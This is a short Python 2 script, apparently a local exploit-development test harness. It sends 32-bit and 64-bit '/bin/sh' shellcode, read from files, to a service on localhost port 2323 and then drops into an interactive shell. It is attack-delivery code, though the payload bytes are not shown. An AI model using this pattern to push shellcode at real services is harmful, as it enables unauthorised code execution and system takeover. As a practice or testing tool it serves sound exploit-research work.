from isis import *
pattern = file("/home/blankwall/pattern").read()

debug = False 
host = "localhost"
port = 2323

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	return s

def test_32():
	shellcode = file("/home/blankwall/Desktop/Shellcode-master/32bitLocalBinSh/shellcode").read()
	s = connect()
	if debug:
		raw_input("?")

	s.send(shellcode + "\n")
	telnet_shell(s)


def test_64():
	shellcode = file("/home/blankwall/Desktop/Shellcode-master/64BitLocalBinSh/shellcode").read()
	s = connect()
	if debug:
		raw_input("?")

	s.send(shellcode + "\n")
	telnet_shell(s)

print "32 Test"
test_32()
raw_input("SWITCH")
test_64()
